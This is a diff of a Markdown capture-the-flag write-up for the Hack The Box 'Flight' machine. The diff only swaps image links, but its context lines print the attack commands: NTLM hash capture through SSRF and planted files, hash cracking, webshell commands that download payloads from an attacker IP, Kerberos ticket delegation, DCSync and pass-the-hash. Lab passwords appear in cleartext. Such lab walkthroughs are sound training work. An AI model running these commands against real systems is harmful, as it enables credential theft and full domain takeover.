@@ -95,7 +95,7 @@ Even though the HTTP server at `flight.htb` didn't redirect to any domain name, 
 ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170110.png)
+![[Pasted image 20251021170110.png]]
 
 **Discovery:** Found virtual host `school.flight.htb`
 
@@ -117,7 +117,7 @@ Exploring `school.flight.htb` revealed a web application with a parameter vulner
     <span class="divider-content">SSRF vulnerabilities in Windows environments can be leveraged to force the server to authenticate to attacker-controlled resources using NTLM. By injecting UNC paths pointing to a malicious SMB server, the application makes an authentication attempt, leaking the NTLMv2 hash which can then be cracked offline.</span>
 </div>
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170146.png)
+![[Pasted image 20251021170146.png]]
 
 ### Exploitation
 
@@ -126,21 +126,21 @@ Exploring `school.flight.htb` revealed a web application with a parameter vulner
 responder -I tun0
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170205.png)
+![[Pasted image 20251021170205.png]]
 
 **Step 2:** Trigger SSRF with UNC path injection
 ```bash
 curl "http://school.flight.htb/vulnerable_param?file=\\\\10.10.14.5\\share"
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170221.png)
+![[Pasted image 20251021170221.png]]
 
 **Step 3:** Crack captured NTLMv2 hash
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170233.png)
+![[Pasted image 20251021170233.png]]
 
 <div class="divider divider-root">
     <span class="divider-title">Credentials Obtained</span>
@@ -159,7 +159,7 @@ With valid credentials, SMB shares were enumerated:
 nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214113.png)
+![[Pasted image 20251021214113.png]]
 
 **Available Shares:**
 
@@ -179,7 +179,7 @@ Since `svc_apache` was likely created specifically to run the Apache service, th
 nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214327.png)
+![[Pasted image 20251021214327.png]]
 
 No additional accounts were found with this password, but `svc_apache` has valuable WRITE access to the `Shared` SMB share.
 
@@ -199,7 +199,7 @@ With write access to the `Shared` folder and assuming other users access this sh
 python3 ntlm_theft.py -g all -s 10.10.14.5 -f shared_files
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021205646.png)
+![[Pasted image 20251021205646.png]]
 
 **Step 2:** Upload all files to the share
 ```bash
@@ -207,18 +207,18 @@ smbclient //flight.htb/Shared -U 'svc_apache%S@Ss!K@*t13'
 smb: \> mput *
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214830.png)
+![[Pasted image 20251021214830.png]]
 
 **Step 3:** Wait for automatic authentication (Responder still running)
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021205703.png)
+![[Pasted image 20251021205703.png]]
 
 **Step 4:** Crack the new hash
 ```bash
 hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214929.png)
+![[Pasted image 20251021214929.png]]
 
 <div class="divider divider-root">
     <span class="divider-title">New Credentials</span>
@@ -236,7 +236,7 @@ smb: \> cd c.bum\Desktop
 smb: \> get user.txt
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021215042.png)
+![[Pasted image 20251021215042.png]]
 
 **User Flag:** `[REDACTED]`
 
@@ -330,11 +330,11 @@ curl "http://flight.htb/webshell.php?cmd=powershell%20-c%20Invoke-WebRequest%20-
 C:\temp\RunasCs.exe c.bum "Tikkycoll_431012284" "powershell -c \"Invoke-WebRequest -Uri http://10.10.14.5/webshell.aspx -OutFile C:\inetpub\development\webshell.aspx\""
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021211722.png)
+![[Pasted image 20251021211722.png]]
 
 **Step 3:** Verify upload
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021211736.png)
+![[Pasted image 20251021211736.png]]
 
 **Step 4:** Access ASPX shell via SOCKS proxy at `http://localhost:8000/webshell.aspx` and obtain reverse shell
 
@@ -348,14 +348,14 @@ Running `whoami` from the new ASPX shell returned:
 iis apppool\defaultapppool
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021215959.png)
+![[Pasted image 20251021215959.png]]
 
 <div class="divider divider-warning">
     <span class="divider-title">IIS Virtual Accounts</span>
     <span class="divider-content">Virtual Accounts are a special type of local account introduced in Windows Server 2008 R2 for running services. Unlike traditional service accounts, Virtual Accounts do not have passwords or credentials of their own. Instead, when they access network resources, they authenticate using the machine account credentials (COMPUTERNAME$). Since this IIS service is running on the Domain Controller, it authenticates over the network as the DC machine account (G0$), which has full Domain Admin privileges.</span>
 </div>
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220105.png)
+![[Pasted image 20251021220105.png]]
 
 This configuration means the IIS application pool has implicit Domain Controller machine account privileges for network authentication.
 
@@ -375,11 +375,11 @@ powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/Rubeus.exe -OutFile C:\t
 C:\temp\Rubeus.exe tgtdeleg /nowrap
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220313.png)
+![[Pasted image 20251021220313.png]]
 
 The output is a base64-encoded `.kirbi` Kerberos ticket:
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220329.png)
+![[Pasted image 20251021220329.png]]
 
 **Step 3:** Convert ticket format
 ```bash
@@ -396,7 +396,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=ticket.ccache
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220506.png)
+![[Pasted image 20251021220506.png]]
 
 ---
 
@@ -413,7 +413,7 @@ With the TGT for the DC machine account, perform DCSync to extract Administrator
 impacket-secretsdump g0.flight.htb -k -just-dc-user Administrator -no-pass
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220644.png)
+![[Pasted image 20251021220644.png]]
 
 **Administrator NTLM Hash:** `[REDACTED]`
 
@@ -427,7 +427,7 @@ Using the Administrator hash for Pass-the-Hash authentication:
 impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH]
 ```
 
-![](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220744.png)
+![[Pasted image 20251021220744.png]]
 
 <div class="divider divider-root">
     <span class="divider-title">Domain Compromised</span>
